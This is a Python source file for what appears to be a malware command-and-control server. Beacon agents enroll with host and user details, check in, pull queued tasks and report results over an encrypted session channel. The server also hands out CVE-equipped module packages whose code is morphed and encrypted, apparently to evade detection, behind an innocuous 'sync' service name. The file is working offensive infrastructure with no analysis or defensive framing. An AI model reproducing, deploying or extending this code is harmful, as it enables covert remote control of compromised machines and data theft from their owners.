import base64
import json
import os
import random
import shutil
import string
import threading
import zipfile
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse

from db import ComputerDatabase
from enc import Encryptor
from packager import morph_source
from session_crypto import SessionManager
from socket_manager import Server

MODULE_SRC = os.environ.get(
  "BEACON_MODULES",
  os.path.abspath(os.path.join(os.path.dirname(__file__), "../../beacon/modules")),
)
DATA_SRC = os.environ.get(
  "BEACON_DATA",
  os.path.abspath(os.path.join(os.path.dirname(__file__), "../../beacon/data")),
)

SESSIONS = SessionManager()
SOCK_SERV = Server()
threading.Thread(target=SOCK_SERV.run, daemon=True).start()


class RequestHandler(BaseHTTPRequestHandler):
  DB_PATH = os.environ.get(
    "DB_PATH",
    os.path.abspath(os.path.join(os.path.dirname(__file__), "../computers.db")),
  )

  def log_message(self, fmt, *args):
    print(f"[sync] {self.address_string()} - {fmt % args}")

  def _auth_ok(self):
    hdr = self.headers.get("Authorization")
    if not hdr:
      return False
    kind, blob = hdr.split(" ", 1)
    if kind.lower() != "basic":
      return False
    user, pwd = base64.b64decode(blob).decode().split(":", 1)
    return user == os.environ.get("LAB_USER", "admin") and pwd == os.environ.get(
      "LAB_PASS", "password"
    )

  def _read_json(self):
    n = int(self.headers.get("Content-Length", 0))
    if not n:
      return {}
    return json.loads(self.rfile.read(n).decode())

  def _json(self, code, payload):
    raw = json.dumps(payload).encode()
    self.send_response(code)
    self.send_header("Content-Type", "application/json")
    self.send_header("Content-Length", str(len(raw)))
    self.end_headers()
    self.wfile.write(raw)

  def do_GET(self):
    path = urlparse(self.path).path
    if path.startswith("/api/computers/"):
      agent_id = path.rsplit("/", 1)[-1]
      return self._api_results(agent_id)
    self.send_response(404)
    self.end_headers()

  def do_POST(self):
    path = urlparse(self.path).path
    if path == "/v1/session":
      return self._session_open()
    if path == "/v1/channel":
      return self._channel_dispatch()
    if path.startswith("/api/task/"):
      return self._api_enqueue(path.rsplit("/", 1)[-1])
    self.send_response(404)
    self.end_headers()

  def _session_open(self):
    if not self._auth_ok():
      self.send_response(401)
      self.send_header("WWW-Authenticate", 'Basic realm="lab"')
      self.end_headers()
      return
    body = self._read_json()
    sid, server_pk = SESSIONS.open_session(body["pk"])
    self._json(200, {"sid": sid, "pk": server_pk})

  def _channel_dispatch(self):
    if not self._auth_ok():
      self.send_response(401)
      self.end_headers()
      return
    sid = self.headers.get("X-Session-ID")
    ch = SESSIONS.get(sid)
    if not ch:
      self.send_response(403)
      self.end_headers()
      return
    try:
      req = json.loads(ch.unpack(self._read_json()).decode())
      res = self._handle_op(req.get("op"), req.get("data") or {})
      self._json(200, ch.pack(json.dumps(res).encode()))
    except Exception as exc:
      self._json(500, ch.pack(json.dumps({"error": str(exc)}).encode()))

  def _handle_op(self, op, data):
    db = ComputerDatabase(self.DB_PATH)
    try:
      if op == "enroll":
        nid = db.insert_computer(
          data["system_hash"],
          int(data.get("pid", 0)),
          data["username"],
          data["local_ip"],
          data.get("hostname"),
          data.get("os_info"),
          data.get("kernel"),
        )
        return {"node_id": nid}
      if op == "ping":
        db.update_heartbeat(int(data["node_id"]))
        return {"ok": True}
      if op == "next_job":
        task = db.poll_task(int(data["node_id"]))
        return task or {"task": None}
      if op == "report_job":
        db.save_result(
          int(data["node_id"]),
          data.get("task_id"),
          data.get("task_name", "unknown"),
          data.get("result", {}),
        )
        return {"ok": True}
      if op == "pull_package":
        archive = self._build_package(base64.b64decode(data["key"]))
        return {"archive": base64.b64encode(archive).decode()}
      return {"error": "unknown op"}
    finally:
      db.close()

  def _build_package(self, key: bytes) -> bytes:
    salt = "_" + "".join(random.choice(string.ascii_lowercase) for _ in range(8))
    staging = f"/tmp/pkg_src{salt}"
    enc_dir = f"/tmp/pkg_enc{salt}"
    zip_path = f"/tmp/pkg_out{salt}.zip"
    try:
      shutil.copytree(MODULE_SRC, staging)
      os.makedirs(os.path.join(staging, "data"), exist_ok=True)
      cve = os.path.join(DATA_SRC, "cve_db.json")
      if os.path.isfile(cve):
        shutil.copy(cve, os.path.join(staging, "data", "cve_db.json"))
      for root, _, files in os.walk(staging):
        for fn in files:
          if fn.endswith(".py"):
            fp = os.path.join(root, fn)
            with open(fp, "r", encoding="utf-8") as f:
              src = morph_source(f.read())
            with open(fp, "w", encoding="utf-8") as f:
              f.write(src)
      self._encrypt_tree(staging, enc_dir, key)
      with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for root, _, files in os.walk(enc_dir):
          for fn in files:
            full = os.path.join(root, fn)
            zf.write(full, os.path.relpath(full, enc_dir))
      with open(zip_path, "rb") as f:
        return f.read()
    finally:
      shutil.rmtree(staging, ignore_errors=True)
      shutil.rmtree(enc_dir, ignore_errors=True)
      if os.path.isfile(zip_path):
        os.remove(zip_path)

  def _encrypt_tree(self, src_dir, dst_dir, key):
    os.makedirs(dst_dir, exist_ok=True)
    enc = Encryptor(key)
    for root, _, files in os.walk(src_dir):
      rel = os.path.relpath(root, src_dir)
      out_root = dst_dir if rel == "." else os.path.join(dst_dir, rel)
      os.makedirs(out_root, exist_ok=True)
      for fn in files:
        s = os.path.join(root, fn)
        d = os.path.join(out_root, fn)
        with open(s, "r", encoding="utf-8") as f:
          text = f.read()
        with open(d, "w", encoding="utf-8") as f:
          f.write(enc.encrypt_str(text))

  def _api_enqueue(self, agent_id):
    if not self._auth_ok():
      self.send_response(401)
      self.end_headers()
      return
    body = self._read_json()
    db = ComputerDatabase(self.DB_PATH)
    tid = db.enqueue_task(int(agent_id), body["task"])
    db.close()
    self._json(201, {"task_id": tid, "task": body["task"]})

  def _api_results(self, agent_id):
    if not self._auth_ok():
      self.send_response(401)
      self.end_headers()
      return
    db = ComputerDatabase(self.DB_PATH)
    payload = {
      "computer": db.get_computer(int(agent_id)),
      "results": db.get_results(int(agent_id)),
    }
    db.close()
    self._json(200, payload)


def run(port=None):
  port = int(port or os.environ.get("CONTROL_PORT", "1337"))
  srv = HTTPServer(("", port), RequestHandler)
  print(f"[*] Сервис синхронизации :{port}")
  srv.serve_forever()


if __name__ == "__main__":
  run()
